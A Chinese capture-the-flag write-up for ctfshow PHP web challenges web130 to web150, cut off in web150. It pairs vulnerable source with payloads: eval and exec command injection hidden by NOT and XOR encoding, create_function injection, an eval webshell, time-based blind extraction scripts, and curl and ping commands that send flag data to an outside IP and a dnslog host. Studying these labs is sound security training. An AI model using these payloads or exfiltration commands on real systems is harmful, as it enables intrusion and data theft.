函数查找字符串在另一字符串中第一次出现的位置\n所以我们要考虑在ctfshow前面放点什么，但又不影响我们读文件\n可以联想到目录穿越\npayload:\n/ctfshow/../../../../../../../../../../var/www/html/flag.php web130 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-13 05:19:40 9 10*/ 11 12 13error_reporting(0); 14highlight_file(__FILE__); 15include(\u0026#34;flag.php\u0026#34;); 16if(isset($_POST[\u0026#39;f\u0026#39;])){ 17 $f = $_POST[\u0026#39;f\u0026#39;]; 18 19 if(preg_match(\u0026#39;/.+?ctfshow/is\u0026#39;, $f)){ 20 die(\u0026#39;bye!\u0026#39;); 21 } 22 if(stripos($f, \u0026#39;ctfshow\u0026#39;) === FALSE){ 23 die(\u0026#39;bye!!\u0026#39;); 24 } 25 26 echo $flag; 27 28} \u0026lsquo;/.+?ctfshow/is\u0026rsquo; 后面的i表示大小写匹配，s表示忽略换行符，单行匹配\n在不加转义字符的前提下，前面的点表示任意字符，而“+?”表示非贪婪匹配，即前面的字符至少出现一次\n所以，该正则匹配的意思为：ctfshow前面如果出现任意字符，即匹配准确\n再根据下面的stripos为字符串匹配函数，要求输入的参数必须有“ctfshow”字符，所以输入的参数只需要满足ctfshow前面不加任意字符即可\npayload\nPOST f=ctfshow web131 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-13 05:19:40 9 10*/ 11 12 13error_reporting(0); 14highlight_file(__FILE__); 15include(\u0026#34;flag.php\u0026#34;); 16if(isset($_POST[\u0026#39;f\u0026#39;])){ 17 $f = (String)$_POST[\u0026#39;f\u0026#39;]; 18 19 if(preg_match(\u0026#39;/.+?ctfshow/is\u0026#39;, $f)){ 20 die(\u0026#39;bye!\u0026#39;); 21 } 22 if(stripos($f,\u0026#39;36Dctfshow\u0026#39;) === FALSE){ 23 die(\u0026#39;bye!!\u0026#39;); 24 } 25 26 echo $flag; 27 28} 正则表达式溢出 https://www.laruence.com/2010/06/08/1579.html\npayload:\n#payload: \u0026lt;?php echo str_repeat(\u0026#39;very\u0026#39;, \u0026#39;250000\u0026#39;).\u0026#39;36Dctfshow\u0026#39;; 不宜过多，过多会\nweb132 /admin\n1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 06:22:13 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-13 20:05:36 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14#error_reporting(0); 15include(\u0026#34;flag.php\u0026#34;); 16highlight_file(__FILE__); 17 18 19if(isset($_GET[\u0026#39;username\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;password\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;code\u0026#39;])){ 20 $username = (String)$_GET[\u0026#39;username\u0026#39;]; 21 $password = (String)$_GET[\u0026#39;password\u0026#39;]; 22 $code = (String)$_GET[\u0026#39;code\u0026#39;]; 23 24 if($code === mt_rand(1,0x36D) \u0026amp;\u0026amp; $password === $flag || $username ===\u0026#34;admin\u0026#34;){ 25 26 if($code == \u0026#39;admin\u0026#39;){ 27 echo $flag; 28 } 29 30 } 31} 第一个判断后面用的是或\n也就是说只要使username等于admin即可，前面两个无所谓了\n第二个判断让code等于admin即可\npayload：\nGET:?code=admin\u0026amp;username=admin\u0026amp;password= web133 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-13 16:43:44 9 10*/ 11 12error_reporting(0); 13highlight_file(__FILE__); 14//flag.php 15if($F = @$_GET[\u0026#39;F\u0026#39;]){ 16 if(!preg_match(\u0026#39;/system|nc|wget|exec|passthru|netcat/i\u0026#39;, $F)){ 17 eval(substr($F,0,6)); 18 }else{ 19 die(\u0026#34;6个字母都还不够呀?!\u0026#34;); 20 } 21} ctfshow web133(变量覆盖+无回显命令执行dns_bp带外) - hithub - 博客园\n这其实是一道关于变量覆盖的题目\nget传参 F=`$F `;sleep 3 经过substr($F,0,6)截取后 得到 `$F `; 也就是会执行 eval(\u0026#34;`$F `;\u0026#34;); 我们把原来的$F带进去 eval(\u0026#34;``$F `;sleep 3`\u0026#34;); 也就是说最终会执行 ` `$F `;sleep 3 ` == shell_exec(\u0026#34;`$F `;sleep 3\u0026#34;); 前面的命令我们不需要管，但是后面的命令我们可以自由控制。 这样就在服务器上成功执行了 sleep 3 所以 最后就是一道无回显的RCE题目了 payload:\n`$F `;cat flag.php | curl -X POST -d @- http://106.55.168.231:7777/ curl外带rce\nweb134 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-14 23:01:06 9 10*/ 11 12highlight_file(__FILE__); 13$key1 = 0; 14$key2 = 0; 15if(isset($_GET[\u0026#39;key1\u0026#39;]) || isset($_GET[\u0026#39;key2\u0026#39;]) || isset($_POST[\u0026#39;key1\u0026#39;]) || isset($_POST[\u0026#39;key2\u0026#39;])) { 16 die(\u0026#34;nonononono\u0026#34;); 17} 18@parse_str($_SERVER[\u0026#39;QUERY_STRING\u0026#39;]); 19extract($_POST); 20if($key1 == \u0026#39;36d\u0026#39; \u0026amp;\u0026amp; $key2 == \u0026#39;36d\u0026#39;) { 21 die(file_get_contents(\u0026#39;flag.php\u0026#39;)); 22} 看到extract想起变量覆盖\nextract($_POST); //提取$_POST数组 payload:\n?_POST[key1]=36d\u0026amp;_POST[key2]=36d web135 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: Firebasky # @Date: 2020-10-13 11:25:09 # @Last Modified by: h1xa # @Last Modified time: 2020-10-16 18:48:03 */ error_reporting(0); highlight_file(__FILE__); //flag.php if($F = @$_GET[\u0026#39;F\u0026#39;]){ if(!preg_match(\u0026#39;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i\u0026#39;, $F)){ eval(substr($F,0,6)); }else{ die(\u0026#34;师傅们居然破解了前面的，那就来一个加强版吧\u0026#34;); } } 133plus\n这题ban了很多命令\n但是没ban nl,mv，可以用nl和cp把flag写到其他文件中\npayload:\n`$F `;nl f*\u0026gt;1.txt `$F `;mv f*\u0026gt;1.txt 这题也可以用ping进行外带\n`$F`;+ping `cat flag.php|awk \u0026#39;NR==2\u0026#39;`.6x1sys.dnslog.cn #通过ping命令去带出数据，然后awk NR一排一排的获得数据 web136 1\u0026lt;?php 2error_reporting(0); 3function check($x){ 4 if(preg_match(\u0026#39;/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\\u0026amp;|\\*|\\?|\\{|\\}|\\\u0026gt;|\\\u0026lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i\u0026#39;, $x)){ 5 die(\u0026#39;too young too simple sometimes naive!\u0026#39;); 6 } 7} 8if(isset($_GET[\u0026#39;c\u0026#39;])){ 9 $c=$_GET[\u0026#39;c\u0026#39;]; 10 check($c); 11 exec($c); 12} 13else{ 14 highlight_file(__FILE__); 15} 16?\u0026gt; 这题要用到一个linux的命令tee\nLinux tee命令介绍 tee命令在Linux中用于从标准输入读取数据，并将其写入到标准输出和一个或多个文件中。tee命令通常与其他命令一起通过管道使用。\n如\n1ls /|tee 1.txt 就可以将ls /的结果写入到1.txt文件中\nls /|tee 1 这题ban掉了.\n访问url/1，下载文件1\n看到flag的位置\n?c=cat /f149_15_h3r3|tee 2 web137 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-16 22:27:49 9 10*/ 11 12error_reporting(0); 13highlight_file(__FILE__); 14class ctfshow 15{ 16 function __wakeup(){ 17 die(\u0026#34;private class\u0026#34;); 18 } 19 static function getFlag(){ 20 echo file_get_contents(\u0026#34;flag.php\u0026#34;); 21 } 22} 23 24 25 26call_user_func($_POST[\u0026#39;ctfshow\u0026#39;]); 我们需要通过post传入一个数组，数组中包含类名和方法名\npayload\nctfshow[]=ctfshow\u0026amp;ctfshow[]=getFlag 又或者\nctfshow=ctfshow::getFlag web138 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-16 22:52:13 9 10*/ 11 12error_reporting(0); 13highlight_file(__FILE__); 14class ctfshow 15{ 16 function __wakeup(){ 17 die(\u0026#34;private class\u0026#34;); 18 } 19 static function getFlag(){ 20 echo file_get_contents(\u0026#34;flag.php\u0026#34;); 21 } 22} 23 24if(strripos($_POST[\u0026#39;ctfshow\u0026#39;], \u0026#34;:\u0026#34;)\u0026gt;-1){ 25 die(\u0026#34;private function\u0026#34;); 26} 27 28call_user_func($_POST[\u0026#39;ctfshow\u0026#39;]); 这道题限制了上一题的第二种解法\n第一种还能继续使用\npayload:\nctfshow[]=ctfshow\u0026amp;ctfshow[]=getFlag ctfshow[0]=ctfshow\u0026amp;ctfshow[1]=getFlag web139 \u0026lt;?php error_reporting(0); function check($x){ if(preg_match(\u0026#39;/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\\u0026amp;|\\*|\\?|\\{|\\}|\\\u0026gt;|\\\u0026lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i\u0026#39;, $x)){ die(\u0026#39;too young too simple sometimes naive!\u0026#39;); } } if(isset($_GET[\u0026#39;c\u0026#39;])){ $c=$_GET[\u0026#39;c\u0026#39;]; check($c); exec($c); } else{ highlight_file(__FILE__); } ?\u0026gt; 这题看着和前面那题是一样的\n但实际上没有写文件的权限\n这题可以通过时间盲注攻击获取文件名已经文件中的字符等\n时间盲注脚本：\n1import requests 2import time 3import string 4 5str = string.ascii_letters + string.digits + \u0026#34;-\u0026#34; + \u0026#34;{\u0026#34; + \u0026#34;}\u0026#34; + \u0026#34;_\u0026#34; + \u0026#34;~\u0026#34; # 构建一个包含所有字母和数字以及部分符号的字符串，符号可以自己加 6result = \u0026#34;\u0026#34; # 初始化一个空字符串，用于保存结果 7 8#获取多少行 9for i in range(1, 99): 10 key = 0 #用于控制内层循环(j)的结束 11 12 #不break的情况下，一行最多几个字符 13 for j in range(1, 99): 14 if key == 1: 15 break 16 for n in str: #n就是一个一个的返回值 17 payload = \u0026#34;if [ `ls /|awk \u0026#39;NR=={0}\u0026#39;|cut -c {1}` == {2} ];then sleep 3;fi\u0026#34;.format(i, j, n) #{n}是占位符 18 #print(payload) 19 url = \u0026#34;http://89e3e82d-d133-4a9e-a883-790d41e8a3b8.challenge.ctf.show?c=\u0026#34; + payload 20 try: 21 requests.get(url, timeout=(2.5, 2.5)) #设置超时时间为 2.5 秒,包括连接超时和读取超时，超时就是之前sleep 3了。 22 23 # 如果请求发生异常，表示条件满足，将当前字符 n 添加到结果字符串中，并结束当前内层循环 24 except: 25 result = result + n 26 print(result) 27 break 28 if n == \u0026#39;~\u0026#39;: #str的最后一位，“~”不常出现，用作结尾 29 key = 1 30 31 # 在每次获取一个字符后，将一个空格添加到结果字符串中，用于分隔结果的不同位置 32 result += \u0026#34; \u0026#34; 这个脚本的原理其实就是，通过shell编程中的if语句判断\nls /|awk \u0026#39;NR=={0}\u0026#39;|cut -c {1} 中截取到的字符串是否与我们遍历的任一个字符匹配，若匹配成功则使用sleep命令使响应时间变为3s\n而脚本通过判断响应时间即可知道截取到的字符是否匹配，从而一个一个字符的获取\n读到flag的位置，接下来就是读文件了，原理一样\n1import requests 2import time 3import string 4 5str = string.digits+string.ascii_lowercase+\u0026#34;-\u0026#34;+\u0026#34;{\u0026#34;+\u0026#34;}\u0026#34; 6result = \u0026#34;\u0026#34; 7 8for i in range(1, 99): 9 key = 0 10 for j in range(1, 99): 11 if key == 1: 12 break 13 for n in str: 14 payload = \u0026#34;if [ `cat /f149_15_h3r3|awk \u0026#39;NR=={0}\u0026#39;|cut -c {1}` == {2} ];then sleep 3;fi\u0026#34;.format(i, j, n) 15 #print(payload) 16 url = \u0026#34;http://a37f8386-b265-4794-b4d1-7e4e62f05859.challenge.ctf.show//?c=\u0026#34; + payload 17 try: 18 requests.get(url, timeout=(2.5, 2.5)) 19 20\texcept: 21 result = result + n 22 print(result) 23 break 24 25 result += \u0026#34; \u0026#34; web140 函数的利用\n1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-17 12:39:25 9 10*/ 11 12error_reporting(0); 13highlight_file(__FILE__); 14if(isset($_POST[\u0026#39;f1\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;f2\u0026#39;])){ 15 $f1 = (String)$_POST[\u0026#39;f1\u0026#39;]; 16 $f2 = (String)$_POST[\u0026#39;f2\u0026#39;]; 17 if(preg_match(\u0026#39;/^[a-z0-9]+$/\u0026#39;, $f1)){ 18 if(preg_match(\u0026#39;/^[a-z0-9]+$/\u0026#39;, $f2)){ 19 $code = eval(\u0026#34;return $f1($f2());\u0026#34;); 20 if(intval($code) == \u0026#39;ctfshow\u0026#39;){ 21 echo file_get_contents(\u0026#34;flag.php\u0026#34;); 22 } 23 } 24 } 25} 原文\n需要$f1($f2());的返回值，或者是字母开头的字符串，或者是空数组，或者就是0，或者FLASE。\npayload1： system(system())\u0026mdash;\u0026gt; f1=system\u0026amp;f2=system\nstring system( string $command[, int \u0026amp;$return_var] )：成功则返回命令输出的最后一行，失败则返回 FALSE 。system()必须包含参数，失败返回FLASE；system(\u0026lsquo;FLASE\u0026rsquo;)，空指令，失败返回FLASE。\npayload2： usleep(usleep())\u0026mdash;\u0026gt; f1=usleep\u0026amp;f2=usleep usleep没有返回值。 所以intval参数为空，失败返回0\npayload3： getdate(getdate())\u0026mdash;\u0026gt; f1=getdate\u0026amp;f2=getdate\narray getdate([ int $timestamp = time()] )：返回结果是array，参数必须是int型。所以getdate(getdate())\u0026mdash;-\u0026gt;getdate(array型)\u0026mdash;\u0026gt;失败返回flase，intval为0。\nweb141 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-17 19:28:09 9 10*/ 11 12#error_reporting(0); 13highlight_file(__FILE__); 14if(isset($_GET[\u0026#39;v1\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v2\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v3\u0026#39;])){ 15 $v1 = (String)$_GET[\u0026#39;v1\u0026#39;]; 16 $v2 = (String)$_GET[\u0026#39;v2\u0026#39;]; 17 $v3 = (String)$_GET[\u0026#39;v3\u0026#39;]; 18 19 if(is_numeric($v1) \u0026amp;\u0026amp; is_numeric($v2)){ 20 if(preg_match(\u0026#39;/^\\W+$/\u0026#39;, $v3)){ 21 $code = eval(\u0026#34;return $v1$v3$v2;\u0026#34;); 22 echo \u0026#34;$v1$v3$v2 = \u0026#34;.$code; 23 } 24 } 25} preg_match(\u0026#39;/^\\W+$/\u0026#39;, $v3) 此正则表达式用于检查字符串 $v3 是否完全由非单词字符组成，且不能为空。（单词字符：字母、数字和下划线）\n根据题目我们可以联想到取反，或，异或命令执行，这里随便一个都行\nphp中有个有意思的地方，数字是可以和命令进行一些运算的，例如 1-phpinfo();是可以执行phpinfo()命令的。这样就好说了。构造出1-phpinfo()-1就可以了，也就是说 v1=1\u0026amp;v2=1\u0026amp;v3=-phpinfo()-\n羽师傅有个取反脚本\n1\u0026lt;?php 2//在命令行中运行 3 4/*author yu22x*/ 5 6fwrite(STDOUT,\u0026#39;[+]your function: \u0026#39;); 7 8$system=str_replace(array(\u0026#34;\\r\\n\u0026#34;, \u0026#34;\\r\u0026#34;, \u0026#34;\\n\u0026#34;), \u0026#34;\u0026#34;, fgets(STDIN)); 9 10fwrite(STDOUT,\u0026#39;[+]your command: \u0026#39;); 11 12$command=str_replace(array(\u0026#34;\\r\\n\u0026#34;, \u0026#34;\\r\u0026#34;, \u0026#34;\\n\u0026#34;), \u0026#34;\u0026#34;, fgets(STDIN)); 13 14echo \u0026#39;[*] (~\u0026#39;.urlencode(~$system).\u0026#39;)(~\u0026#39;.urlencode(~$command).\u0026#39;);\u0026#39;; 直接用就行\npayload:\n?v1=1\u0026amp;v2=1\u0026amp;v3=-(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)- web142 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-17 19:36:02 9 10*/ 11 12error_reporting(0); 13highlight_file(__FILE__); 14if(isset($_GET[\u0026#39;v1\u0026#39;])){ 15 $v1 = (String)$_GET[\u0026#39;v1\u0026#39;]; 16 if(is_numeric($v1)){ 17 $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d); 18 sleep($d); 19 echo file_get_contents(\u0026#34;flag.php\u0026#34;); 20 } 21} 这题就是一个$d秒后出flag，直接传入v1=0，直接拿到flag\npayload:\n?v1=0 web143 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-18 12:48:14 9 10*/ 11 12highlight_file(__FILE__); 13if(isset($_GET[\u0026#39;v1\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v2\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v3\u0026#39;])){ 14 $v1 = (String)$_GET[\u0026#39;v1\u0026#39;]; 15 $v2 = (String)$_GET[\u0026#39;v2\u0026#39;]; 16 $v3 = (String)$_GET[\u0026#39;v3\u0026#39;]; 17 if(is_numeric($v1) \u0026amp;\u0026amp; is_numeric($v2)){ 18 if(preg_match(\u0026#39;/[a-z]|[0-9]|\\+|\\-|\\.|\\_|\\||\\$|\\{|\\}|\\~|\\%|\\\u0026amp;|\\;/i\u0026#39;, $v3)){ 19 die(\u0026#39;get out hacker!\u0026#39;); 20 } 21 else{ 22 $code = eval(\u0026#34;return $v1$v3$v2;\u0026#34;); 23 echo \u0026#34;$v1$v3$v2 = \u0026#34;.$code; 24 } 25 } 26} 这题ban掉了取反，只能用其他位运算符构造payload\n羽师傅的异或脚本\n1\u0026lt;?php 2 3/*author yu22x*/ 4 5$myfile = fopen(\u0026#34;xor_rce.txt\u0026#34;, \u0026#34;w\u0026#34;); 6$contents=\u0026#34;\u0026#34;; 7for ($i=0; $i \u0026lt; 256; $i++) { 8\tfor ($j=0; $j \u0026lt;256 ; $j++) { 9 10\tif($i\u0026lt;16){ 11\t$hex_i=\u0026#39;0\u0026#39;.dechex($i); 12\t} 13\telse{ 14\t$hex_i=dechex($i); 15\t} 16\tif($j\u0026lt;16){ 17\t$hex_j=\u0026#39;0\u0026#39;.dechex($j); 18\t} 19\telse{ 20\t$hex_j=dechex($j); 21\t} 22\t$preg = \u0026#39;/[a-z]|[0-9]|\\+|\\-|\\.|\\_|\\||\\$|\\{|\\}|\\~|\\%|\\\u0026amp;|\\;/i\u0026#39;; //根据题目给的正则表达式修改即可 23\tif(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){ 24\techo \u0026#34;\u0026#34;; 25 } 26 27\telse{ 28\t$a=\u0026#39;%\u0026#39;.$hex_i; 29\t$b=\u0026#39;%\u0026#39;.$hex_j; 30\t$c=(urldecode($a)^urldecode($b)); 31\tif (ord($c)\u0026gt;=32\u0026amp;ord($c)\u0026lt;=126) { 32\t$contents=$contents.$c.\u0026#34; \u0026#34;.$a.\u0026#34; \u0026#34;.$b.\u0026#34;\\n\u0026#34;; 33\t} 34\t} 35 36} 37} 38fwrite($myfile,$contents); 39fclose($myfile); 1# -*- coding: utf-8 -*- 2 3# author yu22x 4 5import requests 6import urllib 7from sys import * 8import os 9def action(arg): 10 s1=\u0026#34;\u0026#34; 11 s2=\u0026#34;\u0026#34; 12 for i in arg: 13 f=open(\u0026#34;xor_rce.txt\u0026#34;,\u0026#34;r\u0026#34;) 14 while True: 15 t=f.readline() 16 if t==\u0026#34;\u0026#34;: 17 break 18 if t[0]==i: 19 #print(i) 20 s1+=t[2:5] 21 s2+=t[6:9] 22 break 23 f.close() 24 output=\u0026#34;(\\\u0026#34;\u0026#34;+s1+\u0026#34;\\\u0026#34;^\\\u0026#34;\u0026#34;+s2+\u0026#34;\\\u0026#34;)\u0026#34; 25 return(output) 26 27while True: 28 param=action(input(\u0026#34;\\n[+] your function：\u0026#34;) )+action(input(\u0026#34;[+] your command：\u0026#34;))+\u0026#34;;\u0026#34; 29 print(param) web144 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-18 16:21:15 9 10*/ 11 12highlight_file(__FILE__); 13if(isset($_GET[\u0026#39;v1\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v2\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v3\u0026#39;])){ 14 $v1 = (String)$_GET[\u0026#39;v1\u0026#39;]; 15 $v2 = (String)$_GET[\u0026#39;v2\u0026#39;]; 16 $v3 = (String)$_GET[\u0026#39;v3\u0026#39;]; 17 18 if(is_numeric($v1) \u0026amp;\u0026amp; check($v3)){ 19 if(preg_match(\u0026#39;/^\\W+$/\u0026#39;, $v2)){ 20 $code = eval(\u0026#34;return $v1$v3$v2;\u0026#34;); 21 echo \u0026#34;$v1$v3$v2 = \u0026#34;.$code; 22 } 23 } 24} 25 26function check($str){ 27 return strlen($str)===1?true:false; 28} 这题跟143差不多，只是参数交换了一下位置\n直接异或出了\n?v1=1\u0026amp;v2=-(\u0026#34;%0c%06%0c%0b%05%0d\u0026#34;^\u0026#34;%7f%7f%7f%7f%60%60\u0026#34;)(\u0026#34;%03%01%0b%00%06%00\u0026#34;^\u0026#34;%60%60%7f%20%60%2a\u0026#34;)\u0026amp;v3=1 web145 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-18 17:41:33 9 10*/ 11 12 13highlight_file(__FILE__); 14if(isset($_GET[\u0026#39;v1\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v2\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v3\u0026#39;])){ 15 $v1 = (String)$_GET[\u0026#39;v1\u0026#39;]; 16 $v2 = (String)$_GET[\u0026#39;v2\u0026#39;]; 17 $v3 = (String)$_GET[\u0026#39;v3\u0026#39;]; 18 if(is_numeric($v1) \u0026amp;\u0026amp; is_numeric($v2)){ 19 if(preg_match(\u0026#39;/[a-z]|[0-9]|\\@|\\!|\\+|\\-|\\.|\\_|\\$|\\}|\\%|\\\u0026amp;|\\;|\\\u0026lt;|\\\u0026gt;|\\*|\\/|\\^|\\#|\\\u0026#34;/i\u0026#39;, $v3)){ 20 die(\u0026#39;get out hacker!\u0026#39;); 21 } 22 else{ 23 $code = eval(\u0026#34;return $v1$v3$v2;\u0026#34;); 24 echo \u0026#34;$v1$v3$v2 = \u0026#34;.$code; 25 } 26 } 27} 这题ban掉了异或运算符^,同时也ban掉了加减乘除\n但是我们还可以考虑构造三目运算符配合取反\npayload:\n/?v1=1\u0026amp;v2=1\u0026amp;v3=?(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5): web146 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-18 17:41:33 9 10*/ 11 12 13highlight_file(__FILE__); 14if(isset($_GET[\u0026#39;v1\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v2\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v3\u0026#39;])){ 15 $v1 = (String)$_GET[\u0026#39;v1\u0026#39;]; 16 $v2 = (String)$_GET[\u0026#39;v2\u0026#39;]; 17 $v3 = (String)$_GET[\u0026#39;v3\u0026#39;]; 18 if(is_numeric($v1) \u0026amp;\u0026amp; is_numeric($v2)){ 19 if(preg_match(\u0026#39;/[a-z]|[0-9]|\\@|\\!|\\:|\\+|\\-|\\.|\\_|\\$|\\}|\\%|\\\u0026amp;|\\;|\\\u0026lt;|\\\u0026gt;|\\*|\\/|\\^|\\#|\\\u0026#34;/i\u0026#39;, $v3)){ 20 die(\u0026#39;get out hacker!\u0026#39;); 21 } 22 else{ 23 $code = eval(\u0026#34;return $v1$v3$v2;\u0026#34;); 24 echo \u0026#34;$v1$v3$v2 = \u0026#34;.$code; 25 } 26 } 27} 这题把三目运算符也ban了\n可以考虑使用位运算符|\npayload:\n?v1=1\u0026amp;v2=1\u0026amp;v3=|(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)| web147 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-19 02:04:38 9 10*/ 11 12 13 14highlight_file(__FILE__); 15 16if(isset($_POST[\u0026#39;ctf\u0026#39;])){ 17 $ctfshow = $_POST[\u0026#39;ctf\u0026#39;]; 18 if(!preg_match(\u0026#39;/^[a-z0-9_]*$/isD\u0026#39;,$ctfshow)) { 19 $ctfshow(\u0026#39;\u0026#39;,$_GET[\u0026#39;show\u0026#39;]); 20 } 21 22} create_function()代码注入\n如果我们第二个参数传入 echo 1;}phpinfo();// 就等价于\nfunction f($a) { echo 1;}phpinfo();// } 从而执行phpinfo()命令 那要怎么绕过正则表达式呢\n/^[a-z0-9_]*$/isD 这个正则表达式匹配所有的字母数字和下划线\n而且由于\nphp里默认命名空间是\\，所有原生函数和类都在这个命名空间中。 普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径； 而如果写\\function_name()这样调用函数，则其实是写了一个绝对路径。 如果你在其他namespace里调用系统类，就必须写绝对路径这种写法\n所以我们可以通过\\create_function()来绕过这个正则表达式\npayload:\nGET show=;};system(\u0026#39;cat f*\u0026#39;);/* POST ctf=\\create_function web148 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-19 03:52:11 9 10*/ 11 12 13 14include \u0026#39;flag.php\u0026#39;; 15if(isset($_GET[\u0026#39;code\u0026#39;])){ 16 $code=$_GET[\u0026#39;code\u0026#39;]; 17 if(preg_match(\u0026#34;/[A-Za-z0-9_\\%\\\\|\\~\\\u0026#39;\\,\\.\\:\\@\\\u0026amp;\\*\\+\\- ]+/\u0026#34;,$code)){ 18 die(\u0026#34;error\u0026#34;); 19 } 20 @eval($code); 21} 22else{ 23 highlight_file(__FILE__); 24} 25 26function get_ctfshow_fl0g(){ 27 echo file_get_contents(\u0026#34;flag.php\u0026#34;); 28} 没ban异或运算符\npayload:\n(\u0026#34;%08%02%08%09%05%0d\u0026#34;^\u0026#34;%7b%7b%7b%7d%60%60\u0026#34;)(\u0026#34;%03%01%09%01%06%02\u0026#34;^\u0026#34;%60%60%7d%21%60%28\u0026#34;); //system(\u0026#34;cat f*\u0026#34;); web149 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-19 04:34:40 9 10*/ 11 12 13error_reporting(0); 14highlight_file(__FILE__); 15 16$files = scandir(\u0026#39;./\u0026#39;); 17foreach($files as $file) { 18 if(is_file($file)){ 19 if ($file !== \u0026#34;index.php\u0026#34;) { 20 unlink($file); 21 } 22 } 23} 24 25file_put_contents($_GET[\u0026#39;ctf\u0026#39;], $_POST[\u0026#39;show\u0026#39;]); 26 27$files = scandir(\u0026#39;./\u0026#39;); 28foreach($files as $file) { 29 if(is_file($file)){ 30 if ($file !== \u0026#34;index.php\u0026#34;) { 31 unlink($file); 32 } 33 } 34} 直接用一句话木马覆写掉index.php\nGET ?ctf=index.php POST show=\u0026lt;?php @eval($_POST[\u0026#39;1\u0026#39;]);?\u0026gt; 写入后\nPOST 1=system(\u0026#39;cat /ctfshow_fl0g_here.txt\u0026#39;); web150 非预期 日志注入\n1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-19 07:12:57 9 10*/ 11include(\u0026#34;flag.php\u0026#34;); 12error_reporting(0); 13highlight_file(__FILE__); 14 15class CTFSHOW{ 16 private $username; 17 private $password; 18 private $vip; 19 private $secret; 20 21 function __construct(){ 22 $this-\u0026gt;vip = 0; 23 $this-\u0026gt;secret = $flag; 24 } 25 26 function __destruct(){ 27 echo 